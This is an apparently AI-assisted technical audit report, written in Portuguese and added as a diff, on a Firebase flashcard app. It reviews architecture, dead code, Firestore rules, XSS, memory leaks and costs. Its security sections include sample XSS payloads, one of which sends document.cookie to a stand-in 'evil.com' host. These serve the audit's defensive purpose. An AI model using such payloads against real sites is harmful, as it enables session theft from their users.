@@ -1,0 +1,579 @@
+# AUDITORIA TÉCNICA COMPLETA — PROJETO BARCL
+
+> **Auditor**: Technical Audit Report  
+> **Data**: 2026-05-25  
+> **Escopo**: Full-stack audit — Arquitetura, Segurança, Firebase, Runtime, Dados, UX, Manutenibilidade  
+> **Método**: Análise estática de ~40 arquivos-fonte, ~200KB de código analisados  
+
+---
+
+## AUDITORIA GERAL — Resumo Executivo
+
+> [!CAUTION]
+> **O projeto NÃO está pronto para produção.** Existem falhas estruturais graves que impedem um deploy seguro.
+
+O BARCL é um sistema de flashcards médicos (Pneumologia/Neumologia) construído com Firebase + Vanilla JS modular. A arquitetura demonstra **ambição técnica legítima** — há patterns de Repository, DTOs congelados, Schema Versioning, Migration Engine, Event Bus, Guards de Auth/Role, Audit Logs, e um design system tokenizado. **Porém, a execução está severamente fragmentada.**
+
+O problema central do projeto pode ser resumido em uma frase:
+
+**Existem DUAS aplicações dentro do mesmo repositório que nunca foram unificadas — uma legacy/localStorage e outra Firebase — e o código ativo ignora completamente a arquitetura modular que foi construída.**
+
+O resultado é:
+- ~60% do código modular está **morto** (nunca importado, nunca executado)
+- Dois data models incompatíveis coexistem (`prompt` vs `question`, `images[]` vs `imageUrl`)
+- O progresso é salvo em DOIS lugares (localStorage E Firestore) sem sincronização
+- A camada de Firestore tem bugs fundamentais que a tornam não-funcional em alguns cenários
+- XSS vulnerabilities existem em pelo menos 6 componentes UI
+- Memory leaks por event listeners acumulados em cada render
+
+---
+
+## PONTOS FORTES
+
+Somente os pontos realmente sólidos, com justificativa técnica:
+
+1. **Custom Claims para autorização** — O sistema usa JWT claims (`admin: true`) em vez de campos Firestore para controle de acesso. Isso é a abordagem correta e mais segura, pois as claims são verificadas server-side nas Security Rules e não podem ser modificadas pelo cliente.
+
+2. **Catch-all deny rules** — Tanto `firestore.rules` quanto `storage.rules` têm regras catch-all `allow read, write: if false` no final. Isso garante que paths não explicitamente permitidos são bloqueados por padrão (deny-by-default).
+
+3. **Rollback na registration** — O `auth.service.js` implementa rollback correto: se a criação do perfil Firestore falha após criar o usuário Auth, o usuário Auth é deletado (`deleteUser`). Isso é uma boa prática para evitar entidades órfãs.
+
+4. **Design token system** — O `tokens.css` define variáveis CSS para tipografia, cores, espaçamento, motion e shadows de forma consistente. Boa base para escalabilidade visual.
+
+5. **Email verification enforcement** — O guard de auth verifica `user.emailVerified`, e as Firestore rules (progress subcollection) exigem `isEmailVerified()`. Isso é uma camada de proteção real.
+
+6. **Audit logs append-only** — As Firestore rules impedem update e delete em `audit_logs`. Uma vez criado, o log é imutável. Pattern correto para auditoria.
+
+7. **Runtime environment injection** — Configuração Firebase via `window.__BARCL_ENV__` gerado por script, não hardcoded. Permite diferentes ambientes sem rebuild.
+
+8. **Offline persistence configurada** — `enableIndexedDbPersistence` está implementado (embora com API deprecated).
+
+---
+
+## PROBLEMAS CRÍTICOS
+
+> [!CAUTION]
+> Problemas que **DEVEM** ser resolvidos antes de qualquer deploy em produção.
+
+### C1. Arquitetura Dual Não-Resolvida — Dois Apps no Mesmo Repo
+
+**Arquivos**: [app.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/app.js) (root, 21KB) + [src/js/app.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/app.js) (20KB)
+
+Existem dois entry points com lógica divergente:
+- **Root `app.js`** — versão legacy, usa localStorage, `FLASHCARD_DATA` global, sem Firebase Auth. **Potencialmente dead code** (depende de qual HTML carrega).
+- **`src/js/app.js`** — versão Firebase, usa repositories, DTOs, auth guards. **Este é o ativo** (carregado por `index.html`).
+
+**Risco**: Qual versão está executando? Se alguém editar o root `app.js` pensando que é o ativo, o bug nunca aparece. E vice-versa. Isso é uma fonte garantida de confusão.
+
+---
+
+### C2. ~60% do Código Modular é Dead Code
+
+**Arquivos mortos** (definidos mas NUNCA importados por `src/js/app.js`):
+
+| Arquivo | Tamanho | Status |
+|---------|---------|--------|
+| [animations.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/ui/animations.js) | 1.9KB | ❌ Não importado — `app.js` tem `setupVideoFade()` inline |
+| [loader.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/ui/loader.js) | 725B | ❌ Não importado — `app.js` manipula `card-loader` diretamente |
+| [modal.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/ui/modal.js) | 1.8KB | ❌ Não importado |
+| [renderer.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/ui/renderer.js) | 3.5KB | ❌ Não importado — `app.js` renderiza inline |
+| [viewer.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/ui/viewer.js) | 5.8KB | ❌ Não importado |
+| [filters.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/features/filters.js) | 1.3KB | ❌ Não importado |
+| [spaced-repetition.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/features/spaced-repetition.js) | 2.2KB | ❌ Não importado |
+| [statistics.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/features/statistics.js) | 3.2KB | ❌ Não importado |
+| [keyboard.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/input/keyboard.js) | 1.3KB | ❌ Não importado |
+| [state.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/core/state.js) | 8.3KB | ❌ Não importado pelo app.js ativo |
+| [validator.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/core/validator.js) | 2.1KB | ❌ Não usado em nenhum schema/repo |
+| [event-bus.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/core/event-bus.js) | 1.4KB | ❌ Não usado pelo app.js ativo |
+| [AppError.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/core/errors/AppError.js) | 756B | ❌ Nunca thrown |
+| [overlay.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/ui/overlay.js) | 6KB | ⚠️ Parcialmente importado (ErrorOverlay, mas não em todos os contextos) |
+
+**Total de dead code**: ~35KB de ~85KB de JS = **~41% do codebase inteiro**.
+
+Esses módulos formam uma **arquitetura completa com EventBus** que nunca foi conectada ao app principal. O `app.js` ativo faz tudo inline.
+
+---
+
+### C3. Dual Data Source — Duas Fontes de Dados Incompatíveis
+
+O sistema tem **TRÊS** cópias do mesmo dataset com **field names diferentes**:
+
+| Arquivo | Campo da Pergunta | Campo de Imagem | Usado por |
+|---------|-------------------|-----------------|-----------|
+| [data.js](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/core/data.js) (61KB) | `prompt` | `images[]` (array) | `State` controller (inactive) |
+| [flashcards.json](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/js/data/flashcards.json) (61KB) | `prompt` | `images[]` (array) | Ninguém diretamente |
+| [formatted_texts.json](file:///C:/Users/jesse/Documents/antigravity/joyful-carson/src/data/formatted_texts.json) (42KB) | `prompt` → mapeado para `question` pelo seed | `images[0]` → `imageUrl` | `seed-firestore.js` |
+
+**O seed script mapeia `prompt` → `question`** e `images[0]` → `imageUrl`, mas o `data.js` mantém os nomes originais. O `flashcard.schema.js` (DTO) espera `question` e `answer` como campos obrigatórios. **Se o fallback local for ativado, todos os cards falham na validação do DTO.**
+
+---
+
+### C4. XSS Vulnerabilities em Pelo Menos 6 Componentes
+
+Todos os componentes de UI usam `innerHTML` com dados não-sanitizados:
+
+```javascript
+// VULNERÁVEL — de auth-ui.js
+menuContainer.innerHTML = `<span>${user.displayName}</span>`;
+
+// VULNERÁVEL — de renderer.js
+container.innerHTML = `<div class="card-question">${card.question}</div>`;
+
+// VULNERÁVEL — de overlay.js
+overlay.innerHTML = `<img src="${imageUrl}" alt="${alt}">`;
+
+// VULNERÁVEL — de admin.js
+tbody.innerHTML += `<td>${card.question.substring(0, 40)}</td>`;
+```
+
+**Vetores de ataque**:
+- `displayName` do Firebase Auth pode conter HTML arbitrário
+- `photoURL` pode conter `" onerror="alert(1)`
+- Conteúdo de flashcards contém HTML intencional (formatação médica com `<p>`, `<strong>`, `<ul>`)
+- Dados carregados de Firestore podem ser manipulados por admin malicioso
+
+---
+
+### C5. Memory Leaks por Event Listeners Acumulados
+
+```javascript
+// Em renderApp() — CHAMADO EM CADA RENDER
+function initCardInteractions() {
+  cardEl.addEventListener('click', ...);      // +1 listener por render
+  document.getElementById('btn-prev')?.addEventListener('click', handlePrevCard);  // +1
+  document.getElementById('btn-next')?.addEventListener('click', handleNextCard);  // +1
+}
+```
+
+Após 10 interações de filtro, existem **10 click handlers** em cada botão. Cada um executa a ação completa. **O card avança/retrocede 10 posições por click.**
+
+Arquivos afetados: `app.js`, `admin.js`, `animations.js`, `overlay.js`, `modal.js`, `keyboard.js`, `auth-ui.js`.
+
+---
+
+### C6. `system/{document=**}` Collection é World-Readable
+
+```
+// firestore.rules
+match /system/{document=**} {
+  allow read: if true;  // ← QUALQUER PESSOA sem autenticação pode ler
+  allow write: if isAdmin();
+}
+```
+
+Configurações internas do sistema, feature flags, seed versions — tudo exposto publicamente sem necessidade de login.
+
+---
+
+### C7. `"public": "."` no Firebase Hosting Expõe Raiz do Projeto
+
+```json
+// firebase.json
+"hosting": {
+  "public": ".",  // ← TODA A RAIZ é a fonte do hosting
+  "ignore": [...]
+}
+```
+
+Se QUALQUER arquivo sensível não estiver na lista de `ignore`, ele é deployado publicamente. A lista de ignore precisa ser mantida manualmente — um `service-account.json` esquecido seria catastrófico.
+
+---
+
+### C8. Seed Script Batch Bug
+
+```javascript
+// seed-firestore.js
+const batch = db.batch();  // ← Um único batch
+// ... adiciona N documentos ...
+if (count === 400) {
+  await batch.commit();  // ← Committa o batch
+  // ← CONTINUA USANDO O MESMO batch object!
+  // Firestore batches são one-shot — após commit, são invalidados
+}
+```
+
+Após o primeiro commit de 400 docs, o batch object é inválido. Documentos subsequentes são silenciosamente perdidos ou geram erros.
+
+---
+
+### C9. Migration Engine Nunca Persiste Migrações
+
+```javascript
+// migration-engine.js — migrations são read-only
+const migratedData = migrations[docType].up(docData);  // transforma
+return migratedData;  // retorna — MAS NUNCA SALVA NO FIRESTORE
+```
+
+A migration roda em CADA leitura, transformando dados in-memory sem persistir de volta. O documento fica eternamente em `schemaVersion: 0`. **Overhead infinito sem progresso real.**
+
+---
+
+### C10. `enableIndexedDbPersistence` é Deprecated
+
+```javascript
+// firebase.service.js
+import { enableIndexedDbPersistence } from 'https://www.gstatic.com/.../firebase-firestore.js';
+enableIndexedDbPersistence(db).catch(...);
+```
+
+Esta API foi deprecated no Firebase SDK v10+. Deve usar `initializeFirestore` com `persistentLocalCache` e `persistentMultipleTabManager`. **Pode parar de funcionar em qualquer update do SDK.**
+
+---
+
+## PROBLEMAS IMPORTANTES
+
+> [!WARNING]
+> Problemas relevantes que impactam confiabilidade e manutenção, mas não são bloqueantes imediatos.
+
+### I1. Nenhum Schema Validation Enforced nos Repositories
+
+Nenhum repository chama `validateFlashcard()`, `validateUser()`, ou o `Validator` antes de escrever no Firestore. **Dados arbitrários passam direto.**
+
+### I2. Firestore Rules Sem Field-Level Validation no User Create
+
+```
+allow create: if isAuthenticated() && request.auth.uid == userId 
+  && request.resource.data.role == 'student';
+```
+
+Verifica `role == 'student'`, mas **não impede campos extras** (ex: `isAdmin: true`, `customPermission: 'all'`). Qualquer campo adicional é aceito silenciosamente.
+
+### I3. Audit Logging é Spoofável
+
+O `userId` no audit log vem do parâmetro passado pelo chamador, não do `auth.currentUser.uid`. Um usuário pode logar ações como outro usuário.
+
+Além disso, usa `new Date().toISOString()` em vez de `serverTimestamp()` — timestamp manipulável pelo cliente.
+
+### I4. Progress Repository Valida DEPOIS de Escrever
+
+```javascript
+// progress.repository.js
+await setDoc(docRef, progressData, { merge: true });  // ← Salva primeiro
+validateProgress(progressData);  // ← Valida depois (!!!)
+```
+
+Dados corrompidos são persistidos antes da validação.
+
+### I5. `setCustomUserClaims` Sobrescreve TODAS as Claims
+
+```javascript
+// bootstrap-admin.js
+await auth.setCustomUserClaims(userRecord.uid, { admin: true });
+// ← Se o user tinha { beta: true, premium: true }, agora só tem { admin: true }
+```
+
+### I6. Nenhum Security Header no Hosting
+
+Sem CSP, X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy. O app é vulnerável a:
+- XSS (sem CSP para mitigar)
+- Clickjacking (sem X-Frame-Options)
+- MIME sniffing (sem X-Content-Type-Options)
+
+### I7. `service-account.json` Sem Proteção no `.gitignore`
+
+Nenhum pattern para service account keys no `.gitignore`. Se alguém colocar `serviceAccountKey.json` ou `barcl-6e65e-firebase-adminsdk-*.json` no repo, será commitado.
+
+### I8. Logger Hardcoded com `IS_DEV = true` em Produção
+
+```javascript
+const IS_DEV = true; // ← Em produção, todos os info logs são emitidos
+```
+
+### I9. Storage Rules Sem Validação de Tipo/Tamanho de Arquivo
+
+```
+match /{allPaths=**} {
+  allow read: if isEmailVerified();
+  allow write: if isAdmin() && isEmailVerified();
+}
+```
+
+Admin pode upload de QUALQUER tipo de arquivo, QUALQUER tamanho. Sem limites de content-type ou size.
+
+### I10. `data.js` Contém HTML Raw nos `explanation` Fields
+
+```javascript
+explanation: "<p><strong>Broncograma aéreo</strong> é a visualização das vias aéreas...</p>"
+```
+
+Se renderizado com `innerHTML` (e é), isso funciona — mas **estabelece um pattern perigoso** onde qualquer conteúdo é tratado como HTML confiável.
+
+### I11. Login Page Permite User Enumeration
+
+Mensagens de erro diferenciadas: `'Usuário não encontrado'` vs `'Senha incorreta'` permitem a um atacante distinguir emails registrados de não-registrados.
+
+### I12. No Test Framework
+
+Zero testes. Sem unit tests, sem integration tests, sem e2e tests. Nenhum `jest`, `vitest`, `playwright`, ou `cypress` instalado.
+
+### I13. Race Condition no Registration
+
+```
+createUserWithEmailAndPassword → (user existe no Auth)
+↓ ← WINDOW: user existe sem perfil Firestore
+UsersRepository.createUser → (perfil Firestore criado)
+```
+
+Se o browser crashar entre as duas operações, existe um Auth user sem Firestore profile. O rollback existe mas depende de execução sem interrupção.
+
+### I14. Duas Keydown Listeners Conflitantes
+
+`src/js/app.js` registra DOIS `document.addEventListener('keydown')` — um para Space/Enter e outro para Escape. Ambos persistem indefinidamente sem cleanup.
+
+---
+
+## PROBLEMAS MENORES
+
+1. **`publicar.bat` é Windows-only** — Não funciona em CI/CD (Linux)
+2. **`firebase-admin` em `dependencies` em vez de `devDependencies`** — Nunca deveria ser deployado
+3. **Sem `autocomplete` attributes** nos campos de password do login
+4. **`alert()` e `confirm()` no admin** — UI modal moderna já existe mas não é usada
+5. **Sem `@media (prefers-reduced-motion)`** — Animações ignoram preferência do usuário
+6. **Sem focus management** — Lightbox, card flip, e modals não gerenciam foco para acessibilidade
+7. **`<html lang="es">`** mas conteúdo é misto espanhol/português
+8. **Sem `<noscript>` fallback** — Tela branca se JS desabilitado
+9. **Double timestamp em `createCard()`** — Dois `new Date()` separados que podem divergir por milliseconds
+10. **`Object.freeze()` é shallow** — `user.preferences.theme` pode ser mutado após freeze
+
+---
+
+## RISCOS FUTUROS
+
+> [!IMPORTANT]
+> Problemas que ainda não existem mas aparecerão conforme o sistema crescer.
+
+1. **Explosão de leitura Firestore** — `getAllPublished()` busca TODOS os flashcards sem paginação. Com 500 cards = 500 reads por page load. Com 5000 cards = 5000 reads.
+
+2. **Múltiplas abas corrompem dados** — `enableIndexedDbPersistence` com `failed-precondition` apenas loga warning. Tabs concorrentes operam com caches divergentes.
+
+3. **Schema divergence entre coleções** — Sem enforcement automático, cada coleção evolui independentemente. `progress` não tem `schemaVersion`, `audit_logs` não tem schema algum.
+
+4. **Módulos mortos viram landmines** — Quando alguém tentar usar `viewer.js` ou `renderer.js`, vai encontrar data model incompatível (`images[]` vs `imageUrl`).
+
+5. **Sem feature flags** — Qualquer mudança requer deploy. Sem AB testing, sem gradual rollout.
+
+6. **Vendor lock-in crescente** — Firebase imports via CDN (`gstatic.com`) sem abstração. Trocar de provider requer reescrever toda a camada de dados.
+
+---
+
+## DÉBITOS TÉCNICOS
+
+Lista explícita de débitos já acumulados:
+
+| # | Débito | Impacto | Esforço |
+|---|--------|---------|---------|
+| 1 | Dead code (~35KB de módulos não usados) | Confusão, peso morto | 2h — deletar ou integrar |
+| 2 | Root `app.js` legacy inteiro (21KB) | Fonte de confusão | 30min — deletar |
+| 3 | Triple data source (data.js, flashcards.json, formatted_texts.json) | Inconsistência | 1h — unificar |
+| 4 | `prompt` vs `question` field naming | Bugs silenciosos | 2h — normalizar |
+| 5 | `images[]` vs `imageUrl` model mismatch | Bugs em fallback | 1h — normalizar |
+| 6 | Migration engine que nunca persiste | Overhead infinito | 3h — implementar write-back |
+| 7 | Seed batch bug | Dados parciais | 1h — fixar batch cycling |
+| 8 | No security headers | Vulnerabilidades web | 30min — adicionar ao firebase.json |
+| 9 | No test infrastructure | Zero confiabilidade | 4h — setup básico |
+| 10 | Event listener cleanup | Memory leaks + bugs | 3h — refatorar UI layer |
+| 11 | innerHTML XSS patterns | Segurança | 3h — migrar para textContent/DOM API |
+| 12 | `IS_DEV = true` hardcoded | Logs em produção | 10min — ler de __BARCL_ENV__ |
+
+---
+
+## RISCOS FIREBASE
+
+### Firestore
+
+1. **`system` collection world-readable** — Expõe metadados do sistema sem autenticação
+2. **Sem field validation em rules** — User documents aceitam campos arbitrários
+3. **Sem composite index para `getAllAdmin()`** — Query `orderBy('createdAt', 'desc')` vai falhar sem index
+4. **`enableIndexedDbPersistence` deprecated** — API pode ser removida em futuras versões do SDK
+5. **Sem App Check** — Nenhuma proteção contra abuse automatizado
+6. **Sem offline queue** — Writes offline não são queued; são perdidos silenciosamente
+
+### Storage
+
+1. **Sem limites de upload** — Admin pode fazer upload de qualquer tipo/tamanho de arquivo
+2. **Sem path structure enforcement** — Arquivos podem ser escritos em qualquer path sob a regra catch-all
+
+### Auth
+
+1. **Claims stale por até 1h** — Após revogar admin, o user mantém access até token refresh
+2. **Sem brute force protection client-side** — Depende apenas do rate limiting do Firebase
+3. **Sem multi-factor authentication** — Auth apenas por email/password
+
+### Hosting
+
+1. **Project root como `public`** — Potencial exposição de arquivos sensíveis
+2. **Sem security headers** — Vulnerável a XSS, clickjacking, MIME sniffing
+
+---
+
+## RISCOS DE ESCALABILIDADE
+
+| O que quebra | Quando | Threshold estimado |
+|-------------|--------|-------------------|
+| `getAllPublished()` sem paginação | Qualquer crescimento | >200 flashcards = UX degradada |
+| Custo de reads por page load | Com mais users | 100 users × 500 cards = 50K reads/dia |
+| `data.js` 61KB sync import | Qualquer cenário | Bloqueia render no mobile |
+| `localStorage` single-user keys | Multi-tenant | 2+ users no mesmo browser |
+| Admin table sem paginação | Mais cards | >100 cards = admin lento |
+| Event listener accumulation | Uso contínuo | ~50 interações = notável lag |
+| Audit log collection | Com tempo | Sem cleanup = crescimento infinito |
+
+---
+
+## RISCOS DE SEGURANÇA
+
+### Vetores de Ataque
+
+1. **Stored XSS via flashcard content** — Admin cria card com `question: '<img src=x onerror=alert(document.cookie)>'`. Todo user que vê o card é afetado.
+
+2. **Stored XSS via displayName** — User registra com `displayName: '<script>fetch("evil.com?c="+document.cookie)</script>'`. Renderizado em `auth-ui.js` e `app.js`.
+
+3. **User enumeration** — Login com email inexistente retorna mensagem diferente de senha incorreta. Permite mapear emails registrados.
+
+4. **System config exfiltration** — `system/{document=**}` é legível sem auth. Se conter feature flags, endpoints internos, ou configurações, ficam expostos.
+
+5. **Firestore document field injection** — User pode adicionar campos arbitrários ao próprio documento (`isAdmin: true`, `bypass: true`). Se qualquer lógica futura ler esses campos sem whitelist, é privilege escalation.
+
+6. **Audit log pollution** — Authenticated user pode criar entries arbitrárias em `audit_logs` com userId spoofado (se as rules permitirem `create` para authenticated users).
+
+7. **Storage abuse** — Admin (ou se credentials vazarem) pode fazer upload de arquivos sem limites de tipo ou tamanho.
+
+---
+
+## RISCOS DE CUSTO
+
+| Risco | Cenário | Impacto estimado |
+|-------|---------|-----------------|
+| `getAllPublished()` sem paginação | 100 users/dia, 500 cards | 50K reads/dia = ~1.5M/mês |
+| Cache de 5 min sem invalidation | Usuário recarrega a cada 3 min | Cache miss = full read |
+| Audit log sem TTL | 100 ações/user/dia, 100 users | 10K writes/dia = 300K/mês |
+| Progress writes por card | 100 users × 30 cards/sessão | 3K writes/dia |
+| Storage sem size limits | Admin upload de vídeos grandes | Custo de storage desproporcional |
+| Sem App Check | Bot abuse | Reads ilimitados por bots |
+
+**Estimativa**: Com 100 usuários ativos, sem otimização, o custo mensal pode atingir o free tier limit rapidamente (50K reads/dia = ~1.5M/mês contra free tier de 50K/dia).
+
+---
+
+## ANÁLISE DE ARQUITETURA
+
+### Separação de Responsabilidades: ⚠️ Fragmentada
+
+A **intenção** da arquitetura é sólida:
+```
+pages/ → guards/ → services/ → repositories/ → schemas/ → Firestore
+  ↕        ↕
+  ui/    features/
+  ↕
+core/ (state, event-bus, storage, logger, validator)
+```
+
+A **realidade** é:
+```
+src/js/app.js → (faz tudo inline, ignora 80% dos módulos)
+```
+
+### Acoplamento: 🔴 Alto
+
+- `app.js` importa diretamente Firebase SDK, repositories, schemas, e manipula DOM — tudo no mesmo arquivo
+- `State` controller importa `data.js` (61KB) diretamente — acoplado ao dataset
+- Admin page importa Firebase Storage SDK diretamente do CDN em vez de usar `firebase.service.js`
+
+### Inversão de Dependência: 🔴 Inexistente
+
+Não há interfaces abstratas. `FlashcardsRepository` é usado diretamente, sem injection. Trocar Firestore por outro backend requer reescrever todos os consumers.
+
+### Boundaries: ⚠️ Inconsistentes
+
+- DTOs existem mas não são enforced nos repositories
+- Guards existem mas têm bugs (promises que não rejeitam em versões alternativas)
+- Validators existem mas não são usados
+
+---
+
+## ANÁLISE DE MANUTENIBILIDADE
+
+### Legibilidade: 6/10
+Código é legível individualmente, mas a falta de clareza sobre qual código é ativo vs dead torna a compreensão do sistema completo muito difícil.
+
+### Onboarding: 3/10
+Um novo desenvolvedor entrando no projeto teria dificuldade extrema para entender:
+- Qual `app.js` é o ativo?
+- Por que existem 3 cópias dos flashcards?
+- Por que metade dos módulos não são importados?
+- Qual data model é o correto (`prompt` ou `question`)?
+
+### Escalabilidade de código: 4/10
+Sem testes, sem linter, sem CI/CD, sem build step. Qualquer mudança é um gamble.
+
+### Previsibilidade: 5/10
+A falta de state management reativo significa que correlacionar ação → efeito requer tracing manual.
+
+---
+
+## SCORE TÉCNICO FINAL
+
+| Dimensão | Score | Justificativa |
+|----------|-------|--------------|
+| **Arquitetura** | 4/10 | Boas intenções, execução fragmentada. Dois apps, dois data models, módulos mortos. |
+| **Segurança** | 4/10 | Claims e deny-rules são bons. XSS em 6+ componentes, sem CSP, sem field validation em rules. |
+| **Escalabilidade** | 3/10 | Zero paginação, 61KB sync load, sem indexes para queries admin. |
+| **Firebase Design** | 5/10 | Rules razoáveis mas com gaps (system world-readable, storage sem limits). Offline support presente. |
+| **Manutenibilidade** | 3/10 | ~41% dead code, triple data source, sem testes, sem CI. |
+| **Runtime Resilience** | 4/10 | Error handling existe em pontos mas memory leaks e stale state são pervasivos. |
+| **Automação** | 4/10 | Seed é idempotente (com bugs), bootstrap funcional. Deploy é .bat Windows-only. |
+| **Organização** | 5/10 | Folder structure é boa. Naming é inconsistente (`prompt` vs `question`). |
+| **Qualidade Enterprise** | 3/10 | Sem testes, sem CI/CD, sem monitoring, sem feature flags, sem staged rollout. |
+
+### **Score Geral: 3.9/10**
+
+---
+
+## ROADMAP OBRIGATÓRIO
+
+### 🔴 Corrigir IMEDIATAMENTE (Antes de qualquer deploy)
+
+1. **Remover `allow read: if true` da collection `system`** — Trocar por `if isAuthenticated()`
+2. **Adicionar security headers no `firebase.json`** — CSP, X-Frame-Options, X-Content-Type-Options, HSTS
+3. **Fixar XSS em todos os componentes UI** — Substituir `innerHTML` por `textContent` ou DOM API segura para todos os dados do usuário
+4. **Adicionar `service-account*.json` e `*-firebase-adminsdk-*.json` ao `.gitignore`**
+5. **Mudar `"public": "."` para um diretório dedicado** (ex: `"public": "dist/"`) ou garantir ignore list é exaustiva
+6. **Adicionar Storage rules com limites** — `request.resource.size < 10MB`, `request.resource.contentType.matches('image/.*')`
+7. **Fixar seed batch bug** — Criar novo batch após cada `commit()`
+
+### 🟡 Pode Esperar (Sprint seguinte)
+
+1. **Unificar data source** — Uma única fonte de verdade (Firestore), remover `data.js` e `flashcards.json`
+2. **Normalizar field names** — `prompt` → `question` everywhere
+3. **Implementar event listener cleanup** — `removeEventListener` ou delegation pattern
+4. **Adicionar test framework** — Vitest + estrutura básica
+5. **Migrar `enableIndexedDbPersistence`** para API atual
+6. **Implementar paginação** — `limit()` + cursor pagination no Firestore
+7. **Fixar audit logging** — Usar `serverTimestamp()`, pegar `userId` do auth state
+8. **Adicionar App Check** — Proteção contra bots
+
+### ❌ Deve Ser REMOVIDO
+
+1. **Root `app.js` (21KB)** — Dead code legacy, fonte de confusão
+2. **`src/js/core/data.js` (61KB)** — Substituir por Firestore como source of truth
+3. **`src/js/data/flashcards.json` (61KB)** — Duplicata desnecessária
+4. **Todos os módulos mortos** se não forem integrados em 30 dias
+
+### 🔧 Deve Ser REFATORADO
+
+1. **`src/js/app.js`** — Extrair lógica inline para os módulos existentes (renderer, viewer, animations, keyboard)
+2. **Migration engine** — Implementar write-back para persistir migrações
+3. **State management** — Conectar EventBus para reatividade, ou usar os módulos que já existem
+4. **Schemas** — Integrar validação nos repositories (antes do write)
+5. **Deploy pipeline** — Migrar de `.bat` para npm scripts + GitHub Actions
+
+### ✅ Está Sólido — NÃO Mexer
+
+1. **Custom Claims architecture** — Correto e seguro
+2. **Catch-all deny rules** — Pattern correto
+3. **Registration rollback** — Implementação sólida
+4. **Design token system** (`tokens.css`) — Boa base
+5. **Email verification enforcement** — Boa camada de segurança
+6. **Audit logs immutability** — Pattern correto nas rules
+7. **Runtime env injection** — Approach correto
+8. **Error translation** (`firebase-errors.js`) — Bem implementado
